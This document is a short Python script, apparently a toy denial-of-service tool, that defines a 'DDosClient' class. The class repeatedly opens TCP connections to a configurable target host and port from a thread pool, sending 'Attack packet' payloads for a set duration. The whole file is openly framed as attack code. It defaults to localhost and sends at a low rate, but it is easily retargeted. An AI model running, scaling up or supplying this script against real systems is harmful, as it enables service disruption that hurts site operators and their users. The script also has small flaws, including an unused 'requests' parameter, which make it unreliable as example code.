import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor

class DDosClient:
    def __init__(self, target_host="127.0.0.1", target_port=8080, max_workers=10):
        self.target_host = target_host
        self.target_port = target_port
        self.executor = ThreadPoolExecutor(max_workers=max_workers)

    def send_request(self):
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((self.target_host, self.target_port))
            client_socket.send(b"Attack packet")
            response = client_socket.recv(1024)
            print(f"Response: {response.decode()}")
            client_socket.close()
        except Exception as e:
            print(f"Error: {e}")

    def start_attack(self, requests=100, duration=10):
        start_time = time.time()
        futures = []
        
        while time.time() - start_time < duration:
            futures.append(self.executor.submit(self.send_request))
            time.sleep(0.1)
            
        return futures

if __name__ == "__main__":
    client = DDosClient()
    client.start_attack()
